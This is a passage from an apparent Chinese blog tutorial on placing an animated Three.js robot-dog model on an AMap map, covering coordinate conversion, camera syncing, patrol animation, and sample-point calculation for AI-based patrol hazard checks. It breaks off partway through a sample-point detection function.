<li>使用地图提供的<code>gl</code>上下文创建渲染器，实现资源共享</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8fb12a6f0c54f1fa56903f8366ed794~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=WMdU80jLFfrvn%2BHx695ayIaq7L0%3D" alt="3 坐标轴辅助线.png" loading="lazy"/></p>
<h3 data-id="heading-10">三、坐标系统转换</h3>
<p>高德地图使用经纬度坐标（WGS84），而Three.js使用3D世界坐标，两者之间的转换是关键。</p>
<h4 data-id="heading-11">3.1 获取自定义坐标系统</h4>
<p>地图实例提供了<code>customCoords</code>工具，用于坐标转换：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 获取自定义坐标系统</span>
<span class="hljs-keyword">const</span> customCoords = mapInstance.<span class="hljs-property">customCoords</span>;

<span class="hljs-comment">// 设置坐标系统中心点（重要：必须在设置模型位置前设置）</span>
<span class="hljs-keyword">const</span> center = mapInstance.<span class="hljs-title function_">getCenter</span>();
customCoords.<span class="hljs-title function_">setCenter</span>([center.<span class="hljs-property">lng</span>, center.<span class="hljs-property">lat</span>]);
</code></pre>
<h4 data-id="heading-12">3.2 经纬度转3D坐标</h4>
<p>使用<code>lngLatsToCoords</code>方法将经纬度转换为Three.js坐标：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 将经纬度 [lng, lat] 转换为Three.js坐标 [x, z, y?]</span>
<span class="hljs-keyword">const</span> position = customCoords.<span class="hljs-title function_">lngLatsToCoords</span>([
  [<span class="hljs-number">120.188767</span>, <span class="hljs-number">30.193832</span>]
])[<span class="hljs-number">0</span>];

<span class="hljs-comment">// 注意：返回的数组格式为 [x, z, y?]</span>
<span class="hljs-comment">// position[0] 对应 Three.js 的 z 轴（纬度）</span>
<span class="hljs-comment">// position[1] 对应 Three.js 的 x 轴（经度）</span>
<span class="hljs-comment">// position[2] 对应 Three.js 的 y 轴（高度，可选）</span>

robotGroup.<span class="hljs-property">position</span>.<span class="hljs-title function_">setX</span>(position[<span class="hljs-number">1</span>]);  <span class="hljs-comment">// x坐标（经度）</span>
robotGroup.<span class="hljs-property">position</span>.<span class="hljs-title function_">setZ</span>(position[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// z坐标（纬度）</span>
robotGroup.<span class="hljs-property">position</span>.<span class="hljs-title function_">setY</span>(position.<span class="hljs-property">length</span> &gt; <span class="hljs-number">2</span> ? position[<span class="hljs-number">2</span>] : <span class="hljs-number">0</span>);  <span class="hljs-comment">// y坐标（高度）</span>
</code></pre>
<p><strong>坐标轴对应关系</strong>：</p>
<ul>
<li>高德地图：X轴（经度），Y轴（纬度），Z轴（高度）</li>
<li>Three.js：X轴（右），Y轴（上），Z轴（前）</li>
<li>转换后：<code>position[1]</code> → Three.js X轴，<code>position[0]</code> → Three.js Z轴</li>
</ul>
<h4 data-id="heading-13">3.3 同步相机参数</h4>
<p>在<code>render</code>方法中，需要同步高德地图的相机参数到Three.js相机：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">render</span>: <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> { near, far, fov, up, lookAt, position } = customCoords.<span class="hljs-title function_">getCameraParams</span>();
  
  <span class="hljs-comment">// 同步相机参数</span>
  camera.<span class="hljs-property">near</span> = near;
  camera.<span class="hljs-property">far</span> = far;
  camera.<span class="hljs-property">fov</span> = fov;
  camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(position[<span class="hljs-number">0</span>], position[<span class="hljs-number">1</span>], position[<span class="hljs-number">2</span>]);
  camera.<span class="hljs-property">up</span>.<span class="hljs-title function_">set</span>(up[<span class="hljs-number">0</span>], up[<span class="hljs-number">1</span>], up[<span class="hljs-number">2</span>]);
  camera.<span class="hljs-title function_">lookAt</span>(lookAt[<span class="hljs-number">0</span>], lookAt[<span class="hljs-number">1</span>], lookAt[<span class="hljs-number">2</span>]);
  camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
  
  <span class="hljs-comment">// 渲染场景</span>
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
  
  <span class="hljs-comment">// 必须执行：重新设置three的gl上下文状态</span>
  renderer.<span class="hljs-title function_">resetState</span>();
}
</code></pre>
<h3 data-id="heading-14">四、加载3D模型</h3>
<h4 data-id="heading-15">4.1 使用GLTFLoader加载模型</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">GLTFLoader</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/loaders/GLTFLoader'</span>;

<span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GLTFLoader</span>();
<span class="hljs-keyword">const</span> modelPath = <span class="hljs-string">'/assets/modules/robot_dog/scene.gltf'</span>;

<span class="hljs-keyword">const</span> gltf = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  loader.<span class="hljs-title function_">load</span>(
    modelPath,
    <span class="hljs-function">(<span class="hljs-params">gltf: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-title function_">resolve</span>(gltf),
    <span class="hljs-function">(<span class="hljs-params">progress: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (progress.<span class="hljs-property">total</span> &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">const</span> percent = (progress.<span class="hljs-property">loaded</span> / progress.<span class="hljs-property">total</span>) * <span class="hljs-number">100</span>;
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模型加载进度:'</span>, percent.<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">'%'</span>);
      }
    },
    reject
  );
});

<span class="hljs-keyword">const</span> robotModel = gltf.<span class="hljs-property">scene</span>;
</code></pre>
<h4 data-id="heading-16">4.2 模型预处理</h4>
<p>加载模型后需要进行预处理，包括材质优化、位置调整等：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 遍历模型所有子对象</span>
robotModel.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">child: THREE.Object3D</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (child <span class="hljs-keyword">instanceof</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">Mesh</span>) {
    <span class="hljs-comment">// 禁用阴影相关功能</span>
    child.<span class="hljs-property">castShadow</span> = <span class="hljs-literal">false</span>;
    child.<span class="hljs-property">receiveShadow</span> = <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// 简化材质，避免使用需要WebGL扩展的高级特性</span>
    <span class="hljs-keyword">if</span> (child.<span class="hljs-property">material</span>) {
      <span class="hljs-keyword">const</span> materials = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(child.<span class="hljs-property">material</span>) 
        ? child.<span class="hljs-property">material</span> 
        : [child.<span class="hljs-property">material</span>];
      
      materials.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">mat: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
        <span class="hljs-comment">// 禁用transmission等高级特性</span>
        <span class="hljs-keyword">if</span> (mat.<span class="hljs-property">transmission</span> !== <span class="hljs-literal">undefined</span>) {
          mat.<span class="hljs-property">transmission</span> = <span class="hljs-number">0</span>;
        }
      });
    }
  }
});

<span class="hljs-comment">// 计算模型边界框并居中</span>
<span class="hljs-keyword">const</span> box = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Box3</span>().<span class="hljs-title function_">setFromObject</span>(robotModel);
<span class="hljs-keyword">const</span> center = box.<span class="hljs-title function_">getCenter</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>());

<span class="hljs-comment">// 将模型居中（X和Z轴）</span>
robotModel.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = -center.<span class="hljs-property">x</span>;
robotModel.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = -center.<span class="hljs-property">z</span>;
<span class="hljs-comment">// 将模型底部放在y=0</span>
robotModel.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = -box.<span class="hljs-property">min</span>.<span class="hljs-property">y</span>;

<span class="hljs-comment">// 设置模型缩放</span>
<span class="hljs-keyword">const</span> scale = <span class="hljs-number">15</span>;
robotModel.<span class="hljs-property">scale</span>.<span class="hljs-title function_">set</span>(scale, scale, scale);
</code></pre>
<h4 data-id="heading-17">4.3 创建模型组并设置初始旋转</h4>
<p>由于高德地图和Three.js的坐标系差异，需要调整模型的初始旋转：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 创建外层Group用于位置和旋转控制</span>
<span class="hljs-keyword">const</span> robotGroup = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>();
robotGroup.<span class="hljs-title function_">add</span>(robotModel);

<span class="hljs-comment">// 设置初始旋转（90, 90, 0）度转换为弧度</span>
<span class="hljs-keyword">const</span> initialRotationX = (<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">180</span>) * <span class="hljs-number">90</span>;
<span class="hljs-keyword">const</span> initialRotationY = (<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">180</span>) * <span class="hljs-number">90</span>;
<span class="hljs-keyword">const</span> initialRotationZ = (<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">180</span>) * <span class="hljs-number">0</span>;
robotGroup.<span class="hljs-property">rotation</span>.<span class="hljs-title function_">set</span>(initialRotationX, initialRotationY, initialRotationZ);

scene.<span class="hljs-title function_">add</span>(robotGroup);
</code></pre>
<h3 data-id="heading-18">五、实现镜头跟随</h3>
<h4 data-id="heading-19">5.1 使用Loca实现镜头跟随</h4>
<p>高德地图的Loca API提供了<code>viewControl.addTrackAnimate</code>方法，可以实现镜头自动跟随路径移动：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 计算路径总距离</span>
<span class="hljs-keyword">let</span> totalDistance = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; paths.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) {
  totalDistance += <span class="hljs-title class_">AMap</span>.<span class="hljs-property">GeometryUtil</span>.<span class="hljs-title function_">distance</span>(paths[i], paths[i + <span class="hljs-number">1</span>]);
}

<span class="hljs-comment">// 假设速度是 1.5 m/s</span>
<span class="hljs-keyword">const</span> speed = <span class="hljs-number">1.5</span>;
<span class="hljs-keyword">const</span> duration = (totalDistance / speed) * <span class="hljs-number">1000</span>;  <span class="hljs-comment">// 转换为毫秒</span>

loca.<span class="hljs-property">viewControl</span>.<span class="hljs-title function_">addTrackAnimate</span>({
  <span class="hljs-attr">path</span>: paths,  <span class="hljs-comment">// 镜头轨迹，二维数组</span>
  <span class="hljs-attr">duration</span>: duration,  <span class="hljs-comment">// 时长（毫秒）</span>
  <span class="hljs-attr">timing</span>: [[<span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0.7</span>]],  <span class="hljs-comment">// 速率控制器</span>
  <span class="hljs-attr">rotationSpeed</span>: <span class="hljs-number">180</span>,  <span class="hljs-comment">// 每秒旋转多少度</span>
}, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'单程巡逻完成'</span>);
  <span class="hljs-comment">// 可以在这里处理往返逻辑</span>
});

loca.<span class="hljs-property">animate</span>.<span class="hljs-title function_">start</span>();  <span class="hljs-comment">// 启动动画</span>
</code></pre>
<h4 data-id="heading-20">5.2 模型位置同步</h4>
<p>在<code>render</code>方法中，根据地图中心点实时更新模型位置：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">render</span>: <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ... 同步相机参数代码 ...</span>
  
  <span class="hljs-keyword">if</span> (robotGroup &amp;&amp; mapInstance &amp;&amp; !patrolFinishedRef.<span class="hljs-property">current</span>) {
    <span class="hljs-comment">// 获取当前地图中心（镜头跟随会改变地图中心）</span>
    <span class="hljs-keyword">const</span> center = mapInstance.<span class="hljs-title function_">getCenter</span>();
    <span class="hljs-keyword">if</span> (center) {
      <span class="hljs-comment">// 更新坐标系统中心点为地图中心点</span>
      customCoords.<span class="hljs-title function_">setCenter</span>([center.<span class="hljs-property">lng</span>, center.<span class="hljs-property">lat</span>]);
      
      <span class="hljs-comment">// 将地图中心转换为Three.js坐标</span>
      <span class="hljs-keyword">const</span> position = customCoords.<span class="hljs-title function_">lngLatsToCoords</span>([
        [center.<span class="hljs-property">lng</span>, center.<span class="hljs-property">lat</span>]
      ])[<span class="hljs-number">0</span>];
      
      <span class="hljs-comment">// 更新模型位置</span>
      robotGroup.<span class="hljs-property">position</span>.<span class="hljs-title function_">setX</span>(position[<span class="hljs-number">1</span>]);
      robotGroup.<span class="hljs-property">position</span>.<span class="hljs-title function_">setZ</span>(position[<span class="hljs-number">0</span>]);
      robotGroup.<span class="hljs-property">position</span>.<span class="hljs-title function_">setY</span>(position.<span class="hljs-property">length</span> &gt; <span class="hljs-number">2</span> ? position[<span class="hljs-number">2</span>] : <span class="hljs-number">0</span>);
      
      <span class="hljs-comment">// 更新模型旋转（根据地图旋转）</span>
      <span class="hljs-keyword">const</span> rotation = mapInstance.<span class="hljs-title function_">getRotation</span>();
      <span class="hljs-keyword">if</span> (rotation !== <span class="hljs-literal">undefined</span>) {
        <span class="hljs-keyword">const</span> initialRotationY = (<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">180</span>) * <span class="hljs-number">90</span>;
        robotGroup.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> = initialRotationY + (rotation * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">180</span>);
      }
    }
  }
  
  <span class="hljs-comment">// 渲染场景</span>
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
  renderer.<span class="hljs-title function_">resetState</span>();
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>使用地图中心点作为模型位置，实现精确跟随</li>
<li>在每次render中更新坐标系统中心点，确保坐标转换准确</li>
<li>同步地图旋转角度到模型Y轴旋转</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/704af9f7931e4a4582b0a4d9a6520a2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=8kAzAZJY8zNP98XWt4v5QW5fWjk%3D" alt="2025-12-21 11.55.23.gif" loading="lazy"/></p>
<h3 data-id="heading-21">六、巡逻动画实现</h3>
<h4 data-id="heading-22">6.1 启动巡逻</h4>
<p>当模型加载完成并设置好初始位置后，可以启动巡逻动画：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">startPatrol</span> = (<span class="hljs-params">paths: <span class="hljs-built_in">number</span>[][], mapInstance: <span class="hljs-built_in">any</span>, AMap: <span class="hljs-built_in">any</span></span>) =&gt; {
  <span class="hljs-comment">// 停止之前的巡逻</span>
  <span class="hljs-variable constant_">TWEEN</span>.<span class="hljs-title function_">removeAll</span>();
  patrolFinishedRef.<span class="hljs-property">current</span> = <span class="hljs-literal">false</span>;
  
  <span class="hljs-comment">// 保存路径</span>
  patrolPathsRef.<span class="hljs-property">current</span> = paths;
  patrolIndexRef.<span class="hljs-property">current</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-comment">// 播放前进动画</span>
  <span class="hljs-title function_">playAnimation</span>(<span class="hljs-string">'1LYP'</span>);  <span class="hljs-comment">// 播放行走动画</span>
  
  <span class="hljs-comment">// 设置坐标系统中心点为路径起点</span>
  <span class="hljs-keyword">const</span> firstPoint = paths[<span class="hljs-number">0</span>];
  customCoordsRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">setCenter</span>([firstPoint[<span class="hljs-number">0</span>], firstPoint[<span class="hljs-number">1</span>]]);
  
  <span class="hljs-comment">// 使用Loca实现镜头跟随</span>
  <span class="hljs-keyword">const</span> loca = locaRef.<span class="hljs-property">current</span>;
  <span class="hljs-keyword">if</span> (loca) {
    <span class="hljs-comment">// ... addTrackAnimate 代码 ...</span>
  }
  
  <span class="hljs-comment">// 启动模型移动动画</span>
  <span class="hljs-title function_">changeObject</span>();
};
</code></pre>
<h4 data-id="heading-23">6.2 模型移动动画</h4>
<p>使用TWEEN.js实现模型在路径点之间的平滑移动：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">changeObject</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (patrolFinishedRef.<span class="hljs-property">current</span> || patrolIndexRef.<span class="hljs-property">current</span> &gt;= patrolPathsRef.<span class="hljs-property">current</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">const</span> sp = patrolPathsRef.<span class="hljs-property">current</span>[patrolIndexRef.<span class="hljs-property">current</span>];
  <span class="hljs-keyword">const</span> ep = patrolPathsRef.<span class="hljs-property">current</span>[patrolIndexRef.<span class="hljs-property">current</span> + <span class="hljs-number">1</span>];
  <span class="hljs-keyword">const</span> s = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(sp[<span class="hljs-number">0</span>], sp[<span class="hljs-number">1</span>]);
  <span class="hljs-keyword">const</span> e = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(ep[<span class="hljs-number">0</span>], ep[<span class="hljs-number">1</span>]);

  <span class="hljs-keyword">const</span> speed = <span class="hljs-number">0.03</span>;
  <span class="hljs-keyword">const</span> dis = <span class="hljs-title class_">AMap</span>.<span class="hljs-property">GeometryUtil</span>.<span class="hljs-title function_">distance</span>(sp, ep);
  
  <span class="hljs-keyword">if</span> (dis &lt;= <span class="hljs-number">0</span>) {
    patrolIndexRef.<span class="hljs-property">current</span>++;
    <span class="hljs-title function_">changeObject</span>();
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 使用TWEEN实现平滑移动</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">TWEEN</span>.<span class="hljs-title class_">Tween</span>(s)
    .<span class="hljs-title function_">to</span>(e.<span class="hljs-title function_">clone</span>(), dis / speed / speedFactor)
    .<span class="hljs-title function_">start</span>()
    .<span class="hljs-title function_">onUpdate</span>(<span class="hljs-function">(<span class="hljs-params">v</span>) =&gt;</span> {
      <span class="hljs-comment">// 更新模型经纬度引用</span>
      modelLngLatRef.<span class="hljs-property">current</span> = [v.<span class="hljs-property">x</span>, v.<span class="hljs-property">y</span>];
      
      <span class="hljs-comment">// 节流更新状态（每100ms更新一次）</span>
      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">if</span> (now - lastUpdateTimeRef.<span class="hljs-property">current</span> &gt; <span class="hljs-number">100</span>) {
        <span class="hljs-title function_">setCurrentLngLat</span>([v.<span class="hljs-property">x</span>, v.<span class="hljs-property">y</span>]);
        <span class="hljs-title function_">checkSamplePoint</span>([v.<span class="hljs-property">x</span>, v.<span class="hljs-property">y</span>], <span class="hljs-title class_">AMap</span>);  <span class="hljs-comment">// 检测取样点</span>
        <span class="hljs-comment">// 计算已巡逻长度</span>
        <span class="hljs-title function_">updatePatrolledLength</span>(v);
        lastUpdateTimeRef.<span class="hljs-property">current</span> = now;
      }
    })
    .<span class="hljs-title function_">onComplete</span>(<span class="hljs-function">() =&gt;</span> {
      accumulatedLengthRef.<span class="hljs-property">current</span> += dis;
      
      <span class="hljs-keyword">if</span> (patrolIndexRef.<span class="hljs-property">current</span> &lt; patrolPathsRef.<span class="hljs-property">current</span>.<span class="hljs-property">length</span> - <span class="hljs-number">2</span>) {
        patrolIndexRef.<span class="hljs-property">current</span>++;
        <span class="hljs-title function_">changeObject</span>();  <span class="hljs-comment">// 继续下一段</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 单程完成</span>
        <span class="hljs-keyword">if</span> (patrolMode !== <span class="hljs-string">'往返'</span>) {
          patrolFinishedRef.<span class="hljs-property">current</span> = <span class="hljs-literal">true</span>;
          <span class="hljs-title function_">playAnimation</span>(<span class="hljs-string">'1Idle'</span>);  <span class="hljs-comment">// 播放静止动画</span>
        }
      }
    });
};
</code></pre>
<h4 data-id="heading-24">6.3 动画系统</h4>
<p>模型支持多种动画（行走、静止、跳舞等），使用<code>AnimationMixer</code>管理：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置动画系统</span>
<span class="hljs-keyword">if</span> (gltf.<span class="hljs-property">animations</span> &amp;&amp; gltf.<span class="hljs-property">animations</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
  <span class="hljs-keyword">const</span> mixer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">AnimationMixer</span>(robotModel);
  
  <span class="hljs-comment">// 创建所有动画动作</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">AnimationAction</span>&gt;();
  gltf.<span class="hljs-property">animations</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">clip: THREE.AnimationClip</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> action = mixer.<span class="hljs-title function_">clipAction</span>(clip);
    action.<span class="hljs-title function_">setLoop</span>(<span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">LoopRepeat</span>);  <span class="hljs-comment">// 循环播放</span>
    actions.<span class="hljs-title function_">set</span>(clip.<span class="hljs-property">name</span>, action);
  });
  
  <span class="hljs-comment">// 播放默认静止动画</span>
  <span class="hljs-keyword">const</span> defaultAction = actions.<span class="hljs-title function_">get</span>(<span class="hljs-string">'1Idle'</span>);
  <span class="hljs-keyword">if</span> (defaultAction) {
    defaultAction.<span class="hljs-title function_">setEffectiveTimeScale</span>(<span class="hljs-number">0.6</span>);  <span class="hljs-comment">// 设置播放速度</span>
    defaultAction.<span class="hljs-title function_">fadeIn</span>(<span class="hljs-number">0.3</span>);
    defaultAction.<span class="hljs-title function_">play</span>();
  }
}

<span class="hljs-comment">// 在render循环中更新动画</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">render</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">render</span>();
  });
  
  <span class="hljs-comment">// 更新动画混合器</span>
  <span class="hljs-keyword">if</span> (mixer) {
    <span class="hljs-keyword">const</span> currentTime = performance.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">const</span> delta = (currentTime - lastAnimationTime) / <span class="hljs-number">1000</span>;
    mixer.<span class="hljs-title function_">update</span>(delta);
    lastAnimationTime = currentTime;
  }
  
  <span class="hljs-comment">// 更新TWEEN动画</span>
  <span class="hljs-variable constant_">TWEEN</span>.<span class="hljs-title function_">update</span>();
  
  <span class="hljs-comment">// 渲染地图</span>
  mapInstance.<span class="hljs-title function_">render</span>();
};
</code></pre>
<blockquote>
<p>图片略大，耐心等候</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20efe3a18e064609bcc6eda76ba1be31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=trCcvYGAT3U7pVGEnsv3hPLkx%2BU%3D" alt="5 动画切换.gif" loading="lazy"/></p>
<h3 data-id="heading-25">七、AI安全隐患自动检测与告警</h3>
<p>系统集成了Coze AI大模型，实现了巡逻过程中的自动安全隐患检测和告警功能。当机械狗沿路线巡逻时，系统会在预设的取样点自动触发AI分析，识别潜在的安全隐患。</p>
<h4 data-id="heading-26">7.1 取样点计算</h4>
<p>系统支持基于路线间隔的自动取样点计算，根据巡逻犬配置的取样间隔（如每50米、100米等），在路线上均匀分布取样点：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 计算取样点（基于路线间隔）</span>
<span class="hljs-keyword">const</span> calculateSamplePoints = (
  <span class="hljs-attr">paths</span>: <span class="hljs-built_in">number</span>[][], 
  <span class="hljs-attr">sampleInterval</span>: <span class="hljs-built_in">number</span>, 
  <span class="hljs-title class_">AMap</span>: <span class="hljs-built_in">any</span>
): <span class="hljs-title class_">Array</span>&lt;{ <span class="hljs-attr">lng</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">lat</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">distance</span>: <span class="hljs-built_in">number</span> }&gt; =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-attr">samplePoints</span>: <span class="hljs-title class_">Array</span>&lt;{ <span class="hljs-attr">lng</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">lat</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">distance</span>: <span class="hljs-built_in">number</span> }&gt; = [];
  <span class="hljs-keyword">let</span> accumulatedDistance = <span class="hljs-number">0</span>;
  
  <span class="hljs-comment">// 从第一个点开始（0米处）</span>
  samplePoints.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">lng</span>: paths[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],
    <span class="hljs-attr">lat</span>: paths[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],
    <span class="hljs-attr">distance</span>: <span class="hljs-number">0</span>,
  });
  
  <span class="hljs-comment">// 遍历路径，计算每个取样点</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; paths.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) {
    <span class="hljs-keyword">const</span> currentPoint = paths[i];
    <span class="hljs-keyword">const</span> nextPoint = paths[i + <span class="hljs-number">1</span>];
    <span class="hljs-keyword">const</span> segmentDistance = <span class="hljs-title class_">AMap</span>.<span class="hljs-property">GeometryUtil</span>.<span class="hljs-title function_">distance</span>(currentPoint, nextPoint);
    
    <span class="hljs-comment">// 检查当前段是否包含取样点</span>
    <span class="hljs-keyword">while</span> (accumulatedDistance + segmentDistance &gt;= (samplePoints.<span class="hljs-property">length</span> * sampleInterval)) {
      <span class="hljs-keyword">const</span> targetDistance = samplePoints.<span class="hljs-property">length</span> * sampleInterval;
      <span class="hljs-keyword">const</span> distanceInSegment = targetDistance - accumulatedDistance;
      
      <span class="hljs-comment">// 计算取样点在当前段中的位置（线性插值）</span>
      <span class="hljs-keyword">const</span> ratio = distanceInSegment / segmentDistance;
      <span class="hljs-keyword">const</span> sampleLng = currentPoint[<span class="hljs-number">0</span>] + (nextPoint[<span class="hljs-number">0</span>] - currentPoint[<span class="hljs-number">0</span>]) * ratio;
      <span class="hljs-keyword">const</span> sampleLat = currentPoint[<span class="hljs-number">1</span>] + (nextPoint[<span class="hljs-number">1</span>] - currentPoint[<span class="hljs-number">1</span>]) * ratio;
      
      samplePoints.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">lng</span>: sampleLng,
        <span class="hljs-attr">lat</span>: sampleLat,
        <span class="hljs-attr">distance</span>: targetDistance,
      });
    }
    
    accumulatedDistance += segmentDistance;
  }
  
  <span class="hljs-keyword">return</span> samplePoints;
};
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>使用高德地图的<code>GeometryUtil.distance</code>计算路径段距离</li>
<li>通过线性插值计算取样点的精确位置</li>
<li>取样点从路线起点开始，按固定间隔均匀分布</li>
</ul>
<h4 data-id="heading-27">7.2 自动触发检测</h4>
<p>在巡逻过程中，系统实时检测模型位置是否到达取样点附近（±10米范围内）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 检测是否到达取样点</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">checkSamplePoint</span> = (<span class="hljs-params">currentLngLat: [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>], AMap: <span class="hljs-built_in">any</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> patrolDog = currentPatrolDogRef.<span class="hljs-property">current</span>;
  <span class="hljs-keyword">const</span> route = currentRouteRefForSample.<span class="hljs-property">current</span>;
  <span class="hljs-keyword">const</span> area = currentAreaRefForSample.<span class="hljs-property">current</span>;
  
  <span class="hljs-keyword">if</span> (!patrolDog || !route || !patrolDog.<span class="hljs-property">cameraDeviceId</span>) {
